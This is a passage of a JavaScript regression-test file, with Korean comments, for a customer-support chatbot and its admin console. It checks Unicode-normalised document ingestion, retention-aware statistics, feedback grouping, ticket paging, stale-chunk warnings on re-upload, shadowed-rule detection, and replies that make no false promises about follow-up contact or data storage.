    '',
    '제2조 (교환 안내)',
    '',
    '교환은 같은 상품의 다른 색상·사이즈에 한해 가능합니다. 교환 배송비는 무료로 처리됩니다.',
  ].join('\n');

  // ① 종전 식 재현 — 완성형만 보는 토큰 경계는 분해형 본문에서 쓸 토큰을 **하나도** 남기지 않는다
  //    (한글은 전부 구분자가 되고, 남는 것은 길이 1의 숫자 조각뿐이라 2자 미만 필터에서 사라진다).
  const oldExtract = (text) => text.toLowerCase().split(/[^0-9a-z가-힣]+/u).filter((t) => t.length >= 2);
  assert.ok(oldExtract(doc).length > 0, '완성형에서도 종전 식이 빈손이다 — 비교가 성립하지 않는다');
  assert.deepEqual(oldExtract(nfd(doc)), [], '종전 식에서도 토큰이 나온다 — 재현이 아무것도 지키지 않는다');

  // ② 고친 쪽 — 분해형이든 완성형이든 **같은 키워드**가 나온다.
  const keys = ingest.extractKeywords(doc, 6);
  assert.ok(keys.length > 0, '완성형에서도 키워드가 없다');
  assert.deepEqual(ingest.extractKeywords(nfd(doc), 6), keys, '분해형에서 다른 키워드가 나온다');

  // ③ 청킹·번호 제목 판정(`제2조`)도 같은 결과다 — 그 판정 역시 완성형 글자로 적혀 있다.
  const chunks = ingest.chunkDocument(doc);
  assert.deepEqual(ingest.chunkDocument(nfd(doc)), chunks, '분해형에서 청크가 달라진다');
  assert.ok(chunks.some((c) => c.heading.includes('교환 안내')), '번호 제목을 집어내지 못한다');

  // ④ 업로드가 통째로 비지 않는다 — 「본문이 너무 짧거나 키워드가 없습니다」로 끝나던 자리.
  const cands = ingest.documentToCandidates(nfd(doc), { title: '환불 안내', category: '문서' });
  assert.ok(cands.length > 0, '분해형 문서에서 후보가 한 건도 나오지 않는다');
  assert.deepEqual(cands, ingest.documentToCandidates(doc, { title: '환불 안내', category: '문서' }));

  // ⑤ 저장되는 글은 완성형이다 — 답변·대표 질문·키워드가 뒤섞이면 다음 비교에서 또 갈라진다.
  for (const c of cands) {
    assert.equal(c.answer, c.answer.normalize('NFC'), '답변이 분해형 그대로 저장된다');
    assert.equal(c.question, c.question.normalize('NFC'), '대표 질문이 분해형 그대로 저장된다');
    for (const k of c.keywords) assert.equal(k, k.normalize('NFC'), '키워드가 분해형 그대로 저장된다');
  }

  // ⑥ 길이 상한은 **사람이 보는 글자**로 잰다 — 분해형을 먼저 자르면 같은 문서가 1/3 지점에서 잘린다.
  const long = '환불 안내입니다. '.repeat(10_000); // 완성형 기준 약 9만 자
  assert.ok(nfd(long).length > ingest.MAX_DOC_CHARS, '재현 조건(분해형이 상한을 넘는다)이 성립하지 않는다');
  const body = (raw) => ingest.chunkDocument(raw).map((c) => c.text).join('');
  assert.equal(body(nfd(long)).length, body(long).length, '분해형 문서가 더 일찍 잘린다');
});

/* ══════════ 디자인 스프린트 — 40차 재감사 (DS 43-1·43-2·43-3) ══════════ */

/**
 * DS 43-1 — 「최근 7일 대화량」이 **보관 한도에 밀려 사라진 날**을 0건으로 말했다.
 *
 * 이 저장소는 최근 500건만 들고 있고(링버퍼) 개인정보 승인 전에는 디스크에도 쓰지 않는다 —
 * 그래서 어제 칸이 비는 흔한 이유는 「대화가 없었다」가 아니라 「기록이 밀려났다」다.
 * 종전에는 두 사실이 모두 `turns: 0` 으로 나와 구분할 수단이 **아예 없었다**(§13).
 */
test('보관 경계보다 앞선 날은 「0건」이 아니라 「기록 없음」이다 (DS 43-1)', opts, async () => {
  process.env.ADMIN_PERSIST = 'false';
  const conv = await importLib('convlog', CONVLOG_DEPS);
  const day = (back) => new Date(Date.now() - back * 86400000).toISOString();

  // ① 한도에 걸려 버리는 경로 — 501건을 넣으면 가장 오래된 것이 밀려난다.
  conv.resetLogs();
  for (let i = 0; i < 501; i += 1) {
    conv.logTurn({
      sessionId: `s43-${i}`, channel: 'web', tenant: null,
      message: '질문', reply: '답', intent: 'kb:x', source: 'kb', escalate: false,
    });
  }
  let s = conv.convStats();
  assert.equal(s.retention.kept, 500, '보관 한도가 다르다');
  assert.equal(s.retention.dropped, true, '버린 적이 있는데 없다고 한다');
  assert.equal(s.totalTurns, 500);

  // ② 종전 식 재현 — 지난 6일은 **건수만 보면** 「0건」이다(이것이 결함의 크기다).
  const past = s.daily.slice(0, 6);
  assert.equal(past.length, 6);
  for (const d of past) assert.equal(d.turns, 0, '재현 조건(지난 날이 비어 있다)이 성립하지 않는다');

  // ③ 고친 쪽 — 그 날들은 「모른다」이고, 오늘은 경계에 걸쳐 「일부」다.
  for (const d of past) assert.equal(d.coverage, 'none', `기록 없는 날을 0건으로 단정한다: ${d.date}`);
  assert.equal(s.daily[6].coverage, 'partial', '경계에 걸친 날을 전부라고 말한다');
  assert.equal(s.today.coverage, 'partial', '오늘 수가 그날 전부라고 말한다');

  // ④ 경계 **뒤**의 조용한 날은 그대로 0건이다 — 모르는 것과 없는 것을 뒤집지 않는다.
  //    사흘 전부터의 기록을 되돌리면 이틀 전·어제는 「정말 대화가 없었다」가 된다.
  const snap = {
    version: 1, savedAt: day(0), seq: 3,
    turns: [
      { id: 'T-000001', sessionId: 'a', channel: 'web', tenant: null, message: '질문', reply: '답', intent: 'kb:x', source: 'kb', escalate: false, at: day(3) },
      { id: 'T-000002', sessionId: 'b', channel: 'web', tenant: null, message: '질문', reply: '답', intent: 'kb:x', source: 'kb', escalate: false, at: day(0) },
    ],
  };
  assert.equal(conv.importTurns(snap).ok, true);
  s = conv.convStats();
  assert.equal(s.retention.kept, 2);
  assert.equal(s.daily[3].coverage, 'partial', '스냅샷의 가장 오래된 날이 경계여야 한다');
  for (const d of s.daily.slice(0, 3)) assert.equal(d.coverage, 'none', '스냅샷보다 앞선 날을 0건으로 단정한다');
  for (const d of s.daily.slice(4)) assert.equal(d.coverage, 'full', '경계 뒤의 조용한 날을 「모른다」로 미룬다');
  assert.equal(s.daily[4].turns, 0, '없던 대화를 지어낸다');
  assert.equal(s.retention.dropped, false, '버린 적이 없는데 버렸다고 한다');

  // ⑤ 초기화하면 경계도 지금으로 돌아온다(그 전의 일은 모른다).
  conv.resetLogs();
  s = conv.convStats();
  assert.equal(s.retention.kept, 0);
  assert.equal(s.today.coverage, 'partial', '빈 저장소가 오늘 전부를 안다고 말한다');
  assert.ok(s.retention.knownFrom > snap.turns[0].at, '경계가 갱신되지 않았다');
});

/**
 * DS 43-2 — 평가가 「어느 자료에 대한 것인가」를 **바뀌는 이름**으로 들고 있었다.
 *
 * 열쇠가 근거 라벨(`source || question`)이라서 ① 문서 하나에서 만든 항목들이 라벨을 공유해
 * 한 줄로 뭉치고 ② 운영자가 이름을 고치면 두 줄로 갈라지고 ③ 지운 자료의 줄을 누르면
 * 지식베이스 검색이 0건을 냈다 — 그 줄이 「다음에 고칠 자료」인데 데려갈 곳이 없었다(DS 32-1).
 */
test('평가는 자료 id 로 묶이고 이름은 지금 KB 에서 붙인다 (DS 43-2)', opts, async () => {
  process.env.ADMIN_PERSIST = 'false';
  const F = await importLib('feedback', ['storage', 'logger', 'monitoring', 'refusal']);
  const down = (kbId, citation) => F.recordFeedback({ sessionHash: 'h1', verdict: 'down', citation, kbId });

  // ① 이름을 고친 자료 — 종전 식(라벨 열쇠)에서는 두 줄로 갈라진다.
  F.resetFeedback();
  down('kb_refund', '환불 규정');
  down('kb_refund', '환불 규정');
  down('kb_refund', '환불·교환 규정'); // 운영자가 대표 질문을 고친 뒤 들어온 평가
  assert.equal(new Set(['환불 규정', '환불 규정', '환불·교환 규정']).size, 2,
    '종전 식에서도 한 줄이다 — 재현이 아무것도 지키지 않는다');

  let s = F.feedbackSummary({ kb_refund: '환불·교환 규정 안내' });
  assert.equal(s.topDown.length, 1, '같은 자료의 평가가 이름 때문에 갈라진다');
  assert.equal(s.topDown[0].down, 3, '묶은 수가 받은 수와 다르다');
  assert.equal(s.topDown[0].kbId, 'kb_refund');
  assert.equal(s.topDown[0].citation, '환불·교환 규정 안내', '지금 이름이 아니라 평가 당시 이름을 보여 준다');
  assert.equal(s.topDown[0].missing, undefined, '살아 있는 자료를 지워졌다고 한다');
  assert.equal(s.down, 3);

  // ② 문서 하나에서 만든 두 항목 — 라벨이 같아도 **다른 자료**다(종전 식에서는 한 줄이었다).
  F.resetFeedback();
  down('kb_doc_1', '사내 규정 문서');
  down('kb_doc_2', '사내 규정 문서');
  s = F.feedbackSummary({ kb_doc_1: '휴가 신청', kb_doc_2: '출장 정산' });
  assert.equal(s.topDown.length, 2, '서로 다른 자료의 평가가 한 줄로 뭉친다');
  assert.deepEqual(s.topDown.map((t) => t.citation).sort(), ['출장 정산', '휴가 신청']);

  // ③ 지워진 자료 — 줄은 남기고 「지금은 없다」고 말한다(이름을 지어내지 않는다).
  F.resetFeedback();
  down('kb_gone', '없어진 안내문');
  s = F.feedbackSummary({ kb_other: '다른 자료' });
  assert.equal(s.topDown[0].missing, true, '지워진 자료를 검색으로 데려간다');
  assert.equal(s.topDown[0].citation, '없어진 안내문', '평가 당시의 이름조차 잃는다');

  // ④ 사전을 넘기지 않으면 아무것도 단정하지 않는다(이름도 그대로, 「지워졌다」도 아니다).
  s = F.feedbackSummary();
  assert.equal(s.topDown[0].citation, '없어진 안내문');
  assert.equal(s.topDown[0].missing, undefined, '모르는 것을 지워졌다고 말한다');

  // ⑤ 옛 기록(자료 id 없음)은 라벨로 묶인 채 둔다 — 그때는 「어느 자료인지 모른다」다.
  F.resetFeedback();
  F.recordFeedback({ sessionHash: 'h', verdict: 'down', citation: '옛 라벨' });
  F.recordFeedback({ sessionHash: 'h', verdict: 'down', citation: '옛 라벨' });
  s = F.feedbackSummary({});
  assert.equal(s.topDown.length, 1);
  assert.equal(s.topDown[0].down, 2);
  assert.equal(s.topDown[0].kbId, undefined);
  assert.equal(s.topDown[0].missing, undefined, 'id 가 없는 기록을 지워진 자료로 센다');
  assert.equal(s.topDown[0].key, 'label:옛 라벨');

  // ⑥ 근거 없이 답한 평가는 여전히 한 줄로 모인다(고칠 자료가 없는 줄이다).
  F.recordFeedback({ sessionHash: 'h', verdict: 'down', citation: '' });
  s = F.feedbackSummary({});
  assert.ok(s.topDown.some((t) => t.citation === F.NO_CITATION_LABEL), '근거 없음 줄이 사라졌다');

  // ⑦ 스냅샷을 되돌려도 자료 id 가 남는다 — 재기동 뒤에 다시 이름으로 묶이면 안 된다.
  F.resetFeedback();
  down('kb_keep', '보관 확인');
  assert.equal(F.importFeedback(JSON.parse(JSON.stringify(F.exportFeedback()))).ok, true);
  assert.equal(F.listFeedback()[0].kbId, 'kb_keep', '복원하면서 자료 id 를 잃는다');
  assert.equal(F.feedbackSummary({ kb_keep: '보관 확인 안내' }).topDown[0].citation, '보관 확인 안내');
});

/**
 * DS 43-3 — 접수 목록을 **전부** 실어 보내고, 콘솔은 30초마다 그것을 다시 받았다.
 *
 * 접수는 고객이 만드는 데이터라 상한이 없다. 화면은 31차에 15행씩 나눠 그리게 됐지만(DS 31-1)
 * 나눈 것은 **그리는 방법**뿐이라, 운영 반년 뒤에도 보이는 것은 그대로인데 받는 양만 커진다.
 */
test('접수 목록은 한 묶음씩 내려오고 대기 중인 요청은 상한에 밀리지 않는다 (DS 43-3)', opts, async () => {
  process.env.ADMIN_PERSIST = 'false';
  const esc = await importLib('escalation', ['handoff', 'storage', 'refusal', 'pii', 'limits', 'logger', 'monitoring', 'normalize']);
  esc.resetTickets();

  // 대기 5건이 **먼저** 들어오고 완료 25건이 뒤에 들어온다(최신순으로 자르면 대기가 전부 밀려난다).
  const open = [];
  for (let i = 0; i < 5; i += 1) {
    open.push(esc.createTicket({ sessionId: `live-${i}`, tenant: null, message: '대기 중 문의' }).ticket.id);
  }
  for (let i = 0; i < 25; i += 1) {
    const t = esc.createTicket({ sessionId: `done-${i}`, tenant: null, message: '끝난 문의' }).ticket;
    assert.equal(esc.updateTicket(t.id, { status: 'resolved' }).ok, true);
  }

  // ① 종전 식 재현 — 조회가 부르던 함수는 **30건 전부**를 돌려준다.
  assert.equal(esc.listTickets().length, 30, '재현 조건이 성립하지 않는다');
  assert.equal(esc.listTickets().slice(0, 10).some((t) => t.status === 'open'), false,
    '최신 10건에 대기 건이 섞여 있다 — 재현이 아무것도 지키지 않는다');

  // ② 상한을 걸면 그만큼만 — 전체 수는 따로 말한다(보여 준 수를 전체라 말하지 않는다).
  const page = esc.queryTickets(10);
  assert.equal(page.tickets.length, 10, '상한을 넘겨 보낸다');
  assert.equal(page.total, 30, '전체 수를 말하지 않는다');
  assert.equal(page.truncated, true);
  assert.equal(page.limit, 10);

  // ③ **대기 중 5건은 전부** 들어 있다 — 최신순으로만 잘랐다면 하나도 없었을 자리다.
  const ids = page.tickets.map((t) => t.id);
  for (const id of open) assert.ok(ids.includes(id), `대기 중 접수가 상한에 밀려 사라졌다: ${id}`);

  // ④ 순서는 최신순 그대로다(표의 기본 순서가 뜻을 가진 화면이다).
  const order = esc.listTickets().map((t) => t.id);
  assert.deepEqual(ids, [...ids].sort((a, b) => order.indexOf(a) - order.indexOf(b)), '고른 뒤 순서가 섞였다');

  // ⑤ 전체가 상한 안이면 자르지 않는다.
  const all = esc.queryTickets(200);
  assert.equal(all.tickets.length, 30);
  assert.equal(all.truncated, false);

  // ⑥ 상한·이상한 값은 서버가 막는다(화면이 보내는 수를 그대로 믿지 않는다).
  assert.equal(esc.queryTickets(9999).limit, esc.TICKET_PAGE_MAX, '상한이 열려 있다');
  assert.equal(esc.queryTickets(0).limit, esc.TICKET_PAGE_DEFAULT);
  assert.equal(esc.queryTickets(Number.NaN).limit, esc.TICKET_PAGE_DEFAULT);
  assert.equal(esc.queryTickets(-5).limit, esc.TICKET_PAGE_DEFAULT);

  // ⑦ 대기 건이 상한보다 많으면 대기 건으로만 채운다(완료를 끼워 넣지 않는다).
  const live3 = esc.queryTickets(3);
  assert.equal(live3.tickets.length, 3);
  assert.equal(live3.tickets.every((t) => t.status === 'open'), true, '대기 건을 두고 완료 건을 먼저 담는다');
});

/* ══════════ 디자인 스프린트 — 41차 재감사 (DS 44-1·44-3) ══════════ */

/**
 * DS 44-1 — 같은 이름으로 다시 들어온 것이 **앞의 것을 조용히 밀어냈다**.
 *
 * ① 문서를 다시 올리면 후보 id 가 그대로 겹친다(`doc_<문서명>_001`). 수정판을 갈아 끼우는 것은
 *    의도지만, **조각 수가 줄면** 지난 판의 꼬리가 지식베이스에 남아 봇이 두 판본을 함께 근거로
 *    쓴다 — 화면은 「신규 0 · 갱신 2」라고만 적었다.
 * ② 문서명이 달라도 띄어쓰기·문장부호를 뺀 이름이 같으면 같은 자리를 쓴다(남의 문서를 덮어쓴다).
 * ③ 자동 식별자가 `Date.now()` 하나였다 — 같은 밀리초의 둘째는 첫째와 같은 id 를 받아 **덮어썼다**.
 */
test('다시 올린 문서가 남기는 것과 덮어쓰는 것을 등록 전에 말한다 (DS 44-1)', opts, async () => {
  process.env.ADMIN_PERSIST = 'false';
  // 세 모듈이 **한 컴파일 결과를 공유**해야 KB 상태가 통한다(importLib 캐시 키 = [이름, ...deps]).
  const DEPS = ['adminStore', 'ingest', 'knowledge', 'normalize', 'storage', 'logger', 'monitoring', 'refusal'];
  const lib = (name) => importLib(name, DEPS.filter((n) => n !== name));
  const store = await lib('adminStore');
  const ingest = await lib('ingest');
  store.resetKB();
  for (const r of store.listCustomRules()) store.deleteCustomRule(r.intent);

  const doc = (...sections) => ['# 요금 안내', ...sections].join('\n');
  const SEC = {
    base: ['## 기본 요금', '월 10만원입니다. 기본 요금은 계약 시작월부터 청구됩니다. 자세한 안내는 담당자에게 문의하세요.', ''],
    sale: ['## 할인 정책', '연간 결제 시 10% 할인됩니다. 할인은 계약 기간 전체에 적용됩니다.', ''],
    back: ['## 환불 규정', '환불은 신청일 기준으로 처리됩니다. 환불 규정은 약관에 따릅니다. 상담원에게 문의하세요.', ''],
  };
  const commit = (cands) => store.bulkUpsertKB(cands.map(({ chunkIndex, ...e }) => e));

  // ── ③ 같은 밀리초에 잇따라 만들어도 겹치지 않는다(종전 식에서는 둘째가 첫째를 덮어썼다).
  const made = [1, 2, 3].map((n) => store.upsertCustomRule({ label: `R${n}`, keywords: [`kw${n}`], reply: `답${n}` }));
  assert.equal(made.every((r) => r.ok && r.created), true, '잇따라 만든 규칙이 「수정」으로 기록된다');
  assert.equal(new Set(made.map((r) => r.rule.intent)).size, 3, '자동 식별자가 겹친다');
  assert.equal(store.listCustomRules().length, 3, '만든 규칙이 사라졌다');
  const kbIds = [1, 2].map((n) => store.upsertKB({ question: `q${n}`, keywords: [`kq${n}`], answer: `a${n}` }));
  assert.equal(new Set(kbIds.map((r) => r.entry.id)).size, 2, '자료 식별자가 겹친다');
  assert.equal(kbIds.every((r) => r.created), true, '새로 만든 자료가 기존 자료를 덮어썼다');

  // ── ① 세 조각을 올린 뒤, 한 조각만 남긴 수정판을 다시 올린다.
  const v1 = ingest.documentToCandidates(doc(...SEC.base, ...SEC.sale, ...SEC.back), { title: '요금 안내', category: '요금' });
  assert.equal(v1.length, 3, '재현 조건(조각 3개)이 성립하지 않는다');
  assert.equal(commit(v1).created.length, 3);

  const v2 = ingest.documentToCandidates(doc(...SEC.base), { title: '요금 안내', category: '요금' });
  assert.equal(v2.length, 1);
  assert.deepEqual(v2.map((c) => c.id), [v1[0].id], '같은 문서명의 수정판이 다른 자리를 쓴다');

  const prefix = ingest.docIdPrefix('요금 안내');
  const ov = store.docOverlap(prefix, v2.map((c) => c.id), '요금 안내');
  assert.deepEqual(ov.overwrite.map((x) => x.id), [v1[0].id], '갈아 끼우는 항목을 가리지 못한다');
  assert.deepEqual(ov.stale.map((x) => x.id), [v1[1].id, v1[2].id], '남는 지난 조각을 말하지 않는다');
  assert.deepEqual(ov.otherTitles, [], '같은 문서인데 남의 문서라고 말한다');

  // 종전 식 재현 — 등록해도 남는다(지우는 것은 사람이 정한다). 그 사이 봇은 두 판본을 함께 쓴다.
  const after = commit(v2);
  assert.equal(after.created.length, 0);
  assert.equal(after.updated.length, 1);
  const left = store.listKB().filter((e) => e.id.startsWith(`${prefix}_`));
  assert.equal(left.length, 3, '재현 조건(지난 조각이 남는다)이 성립하지 않는다');
  const knowledge = await lib('knowledge');
  const hit = knowledge.matchKnowledge('환불 규정이 어떻게 되나요', 2, store.listKB());
  assert.equal(hit?.entry.id, v1[2].id, '지난 판의 조각이 더 이상 답하지 않는다면 이 결함은 사라진 것이다');

  // 지운 뒤에는 남는 것이 없다고 말한다(화면의 「지난 등록분 지우기」가 이 경로를 쓴다).
  for (const s of ov.stale) assert.equal(store.deleteKB(s.id), true);
  assert.deepEqual(store.docOverlap(prefix, v2.map((c) => c.id), '요금 안내').stale, []);

  // ── ② 문장부호만 다른 문서명은 **같은 자리**를 쓴다 — 남의 문서를 덮어쓴다고 말해야 한다.
  assert.equal(ingest.docIdPrefix('요금 안내!!'), prefix, '재현 조건(슬러그 충돌)이 성립하지 않는다');
  const other = ingest.documentToCandidates(doc(...SEC.base), { title: '요금 안내!!', category: '요금' });
  const ov2 = store.docOverlap(ingest.docIdPrefix('요금 안내!!'), other.map((c) => c.id), '요금 안내!!');
  assert.deepEqual(ov2.otherTitles, ['요금 안내'], '다른 문서를 덮어쓰는데 아무 말이 없다');
  assert.equal(ov2.overwrite.length, 1, '덮어쓰는 항목을 가리지 못한다');

  // 사전(문서명)을 모르면 아무것도 단정하지 않는다 — 「남의 것」이라고 지어내지 않는다.
  assert.deepEqual(store.docOverlap(prefix, other.map((c) => c.id), '').otherTitles, []);
});

/**
 * DS 44-3 — 운영자가 만든 규칙이 **한 번도 쓰이지 않는데** 아무도 그 말을 하지 않았다.
 *
 * 엔진 순서는 「기본 규칙 → 내가 만든 규칙(만든 순서) → 안내 자료」다. 그래서 「배송」·「요금」처럼
 * 기본 규칙이 이미 쓰는 표현으로 규칙을 만들면 그 규칙은 영원히 걸리지 않는다. 종전 콘솔은
 * 저장에 성공했다고 하고, 규칙 미리보기는 「이 규칙이 적용됩니다」라고 적었다.
 */
test('가려진 규칙을 가려내고, 가린 기본 규칙을 끄면 되살아난다 (DS 44-3)', opts, async () => {
  process.env.ADMIN_PERSIST = 'false';
  const chat = await eng('chat');
  const store = await eng('adminStore');
  store.resetKB();
  for (const r of store.listCustomRules()) store.deleteCustomRule(r.intent);

  store.upsertCustomRule({ intent: 'cr_ship', label: '우리 배송 안내', keywords: ['배송', '택배'], reply: '[우리] 2~3일 안에 도착합니다.' });
  store.upsertCustomRule({ intent: 'cr_sat', label: '토요일 운영', keywords: ['토요일'], reply: '[우리] 토요일은 09~13시입니다.' });
  store.upsertCustomRule({ intent: 'cr_sat2', label: '토요일 운영(둘째)', keywords: ['토요일 영업'], reply: '[우리] 둘째 규칙입니다.' });

  // ① 종전 식 재현 — 가려진 규칙의 답은 상담창에 **나가지 않는다**(기본 규칙 문구가 나간다).
  const shipped = chat.replyTo('배송 언제 와요', 'ds44-1');
  assert.equal(shipped.intent, 'delivery', '재현 조건(기본 규칙이 먼저 답한다)이 성립하지 않는다');
  assert.equal(shipped.reply.includes('[우리]'), false, '가려진 규칙의 답이 이미 나가고 있다');

  // ② 가린 쪽을 이름으로 말한다 — 기본 규칙인가, 먼저 만든 내 규칙인가.
  const byBuiltin = chat.shadowOfRule(['배송', '택배'], 'cr_ship');
  assert.deepEqual(byBuiltin, { kind: 'builtin', intent: 'delivery', label: '배송 조회', keyword: '배송' });
  const byCustom = chat.shadowOfRule(['토요일 영업'], 'cr_sat2');
  assert.deepEqual(byCustom, { kind: 'custom', intent: 'cr_sat', label: '토요일 운영', keyword: '토요일 영업' });

  // ③ 가려지지 않은 규칙에는 아무 말도 하지 않는다(멀쩡한 규칙에 경고를 붙이지 않는다).
  assert.equal(chat.shadowOfRule(['토요일'], 'cr_sat'), null, '먼저 만든 규칙이 뒤의 규칙에 가려졌다고 말한다');
  assert.equal(chat.replyTo('토요일에도 하나요', 'ds44-2').reply.includes('[우리]'), true, '가려지지 않은 규칙이 쓰이지 않는다');

  // ④ 끈 규칙은 가리지 않는다 — 화면이 「그 기본 규칙을 끄세요」라고 말할 수 있는 근거다.
  store.setRuleOverride('delivery', { enabled: false });
  assert.equal(chat.shadowOfRule(['배송'], 'cr_ship'), null, '끈 기본 규칙이 여전히 가린다고 말한다');
  assert.equal(chat.replyTo('배송 언제 와요', 'ds44-3').reply.includes('[우리]'), true, '끈 뒤에도 내 규칙이 쓰이지 않는다');
  store.setRuleOverride('delivery', { enabled: true });

  // ⑤ 끈 내 규칙도 남을 가리지 않는다.
  store.upsertCustomRule({ intent: 'cr_sat', enabled: false });
  assert.equal(chat.shadowOfRule(['토요일 영업'], 'cr_sat2'), null, '꺼 둔 규칙이 남을 가린다');
  store.upsertCustomRule({ intent: 'cr_sat', enabled: true });

  // ⑥ 아직 저장하지 않은 규칙(식별자 없음)도 판정할 수 있다 — 저장 응답이 쓰는 경로다.
  assert.equal(chat.shadowOfRule(['택배']).kind, 'builtin');
  assert.equal(chat.shadowOfRule(['토요일 영업']).intent, 'cr_sat', '목록 끝에 붙을 규칙을 가리지 못한다');
  // 빈 표현·공백은 아무것도 가리지 않는다(없는 경고를 만들지 않는다).
  assert.equal(chat.shadowOfRule(['', '   ']), null);
  assert.equal(chat.shadowOfRule([]), null);
});

/* ══════════ 디자인 스프린트 — 42차 재감사 (DS 45-1·45-2·45-3) ══════════ */

/**
 * DS 45-1 — 상담원이 **이 창에 말을 걸 수 있다**고 말했다.
 *
 * 연락처를 건너뛴 고객에게 엔진은 「접수는 유지되니 **이 창을 열어두시면** 상담원이 순서대로
 * 응대해 드릴게요」라고 했고, 폼을 마친 고객에게는 연락처가 있든 없든 「상담원이 확인 후
 * 순서대로 연락드릴게요」라고 했다. 그런데 이 제품에는 상담원이 고객 쪽으로 글을 보내는 길이
 * 없다 — 위젯이 부르는 창구는 `/api/chat`·`/api/feedback`·`/api/escalation` 셋뿐이고
 * 그마저 자기가 보낸 요청의 답만 받는다. 연락처 없이 접수한 사람은 창을 지키고 앉아
 * **영영 오지 않는 답**을 기다렸다.
 */
test('연락처 없이 접수한 사람에게 올 수 없는 답을 약속하지 않는다 (DS 45-1)', opts, async () => {
  process.env.ADMIN_PERSIST = 'false';
  const chat = await eng('chat');
  const esc = await eng('escalation');
  const { resetSessions, getSession } = await eng('session');

  // ── ① 연락처를 묻고 「건너뛰기」를 받은 자리 ──
  resetSessions();
  esc.resetTickets();
  const sid = 'rt-ds45-skip';
  assert.equal(chat.replyTo('상담원 연결해 주세요', sid).escalate, true, '상담원 전환이 일어나야 이 검증이 의미가 있다');
  assert.equal(getSession(sid).awaitingContact, true, '서버가 연락처를 묻지 않는다 — 전제가 깨졌다');

  const skipped = chat.replyTo('괜찮아요', sid);
  assert.equal(skipped.intent, 'contact_skipped', '건너뛰기로 읽히지 않으면 이 검증은 아무것도 지키지 않는다');
  assert.equal(
    /이 창을 열어두시면|응대해 드릴게요|이 대화창으로/.test(skipped.reply),
    false,
    '상담원이 이 창에 말을 걸 수 있다고 말한다 — 그 길은 없다',
  );
  assert.match(skipped.reply, /접수는 그대로 남아 있어요/, '접수가 남는다는 사실까지 함께 지웠다');
  assert.match(skipped.reply, /먼저 연락드릴 방법은 없어요/, '연락이 갈 수 없다는 사실을 말하지 않는다');

  // ── ② 가리킨 길이 **실제로 열려 있다** — 번호만 보내면 그 접수에 붙는다(DS 37-1).
  const added = chat.replyTo('010-1234-5678', sid);
  assert.equal(added.intent, 'contact_captured', '안내한 길이 닫혀 있다 — 없는 조작을 보여 준 셈이다');
  assert.equal(esc.getTicket(added.ticketId).contact, '010-1234-5678');
  assert.match(chat.replyTo('상담원', sid).reply, /남겨 주신 연락처/, '연락처가 붙은 뒤에도 못 한다고 말한다');

  // ── ③ 폼 완료 — 연락처를 건너뛴 접수에 「연락드릴게요」라고 적지 않는다 ──
  resetSessions();
  esc.resetTickets();
  const sidNo = 'rt-ds45-form-nocontact';
  assert.equal(chat.replyTo('위젯이 안 돼요', sidNo).intent, 'form:trouble:start', '장애 신고 폼이 시작되지 않는다 — 전제가 깨졌다');
  chat.replyTo('위젯이 열리지 않아요', sidNo);
  chat.replyTo('1', sidNo);
  const doneNo = chat.replyTo('건너뛰기', sidNo);
  assert.equal(doneNo.intent, 'form:trouble:complete', '폼이 끝나지 않았다 — 전제가 깨졌다');
  assert.equal(esc.getTicket(doneNo.ticketId).contact, undefined, '연락처 없이 끝난 접수가 아니다 — 재현 조건이 깨졌다');
  assert.equal(
    doneNo.reply.includes('상담원이 확인 후 순서대로 연락드릴게요'),
    false,
    '회신할 곳이 없는데 연락드린다고 말한다',
  );
  assert.match(doneNo.reply, /먼저 연락드릴 방법은 없어요/, '연락이 갈 수 없다는 사실을 말하지 않는다');

  // 연락처를 남긴 접수에는 종전 그대로다 — 멀쩡한 약속까지 거두지 않는다.
  resetSessions();
  esc.resetTickets();
  const sidYes = 'rt-ds45-form-contact';
  chat.replyTo('위젯이 안 돼요', sidYes);
  chat.replyTo('위젯이 열리지 않아요', sidYes);
  chat.replyTo('1', sidYes);
  const doneYes = chat.replyTo('010-2222-3333', sidYes);
  assert.equal(doneYes.intent, 'form:trouble:complete');
  assert.equal(esc.getTicket(doneYes.ticketId).contact, '010-2222-3333');
  assert.match(doneYes.reply, /상담원이 확인 후 순서대로 연락드릴게요/, '연락처를 남긴 사람에게 할 말까지 거뒀다');
});

/**
 * DS 45-2 — 「입력하신 내용은 저장하지 않았습니다」는 사실이 아니었다.
 *
 * 접수(티켓)를 만들지 않는 것은 사실이지만, 수집 중에 고객이 친 말은 **턴마다** 남는다 —
 * 세션 대화 버퍼에 쌓여 뒤에 상담원을 부르면 이관 요약의 「직전 대화」로 상담원에게 가고,
 * `/api/chat` 은 같은 턴을 대화 기록(`logTurn`)에도 적는다(관리 콘솔 최근 대화·전역 검색·
 * 내려받기 CSV·백업 스냅샷으로 퍼진다). 그 말을 믿고 이름·연락처를 적은 뒤 취소한 사람에게
 * 그것은 거짓이다(§13).
 */
test('중단한 접수에 「저장하지 않았다」고 말하지 않는다 (DS 45-2)', opts, async () => {
  process.env.ADMIN_PERSIST = 'false';
  const chat = await eng('chat');
  const esc = await eng('escalation');
  const { resetSessions, getSession } = await eng('session');
  resetSessions();
  esc.resetTickets();

  const sid = 'rt-ds45-cancel';
  assert.equal(chat.replyTo('예약하고 싶어요', sid).intent, 'form:reservation:start', '예약 폼이 시작되지 않는다 — 전제가 깨졌다');
  chat.replyTo('홍길동', sid);
  const cancelled = chat.replyTo('취소', sid);
  assert.equal(cancelled.intent, 'form:reservation:cancelled');

  // 접수를 만들지 않는 것은 사실이다 — 그 말은 그대로 둔다.
  assert.equal(esc.listTickets().length, 0, '중단했는데 접수가 생겼다');
  assert.match(cancelled.reply, /접수는 만들지 않았습니다/, '중단으로 무엇이 일어나지 않았는지 말하지 않는다');
  // 사실이 아닌 쪽은 거둔다.
  assert.equal(cancelled.reply.includes('저장하지 않았습니다'), false, '남는 글을 두고 저장하지 않았다고 말한다');
  assert.match(cancelled.reply, /상담 기록에 남/, '남는다는 사실을 말하지 않는다');

  // ── 정말로 남는다 ── 중단은 고객이 친 말을 지우지 않는다.
  assert.deepEqual(
    getSession(sid).turns.filter((t) => t.speaker === 'customer').map((t) => t.text),
    ['예약하고 싶어요', '홍길동', '취소'],
    '중단이 고객이 친 말을 지운다면 이 검증은 아무것도 지키지 않는다',
  );
  // 그리고 뒤에 상담원을 부르면 그 이름이 이관 요약으로 상담원에게 간다.
  const handoff = chat.replyTo('상담원 연결해 주세요', sid);
  assert.ok(
    esc.getTicket(handoff.ticketId).summary.includes('홍길동'),
    '중단한 폼의 입력이 이관 요약에 닿지 않는다면 이 결함은 사라진 것이다',
  );
});

/**
 * DS 45-3 — 고객이 말하지 않은 때를 우리가 지어내 **되읽어 주고** 그대로 접수했다.
 *
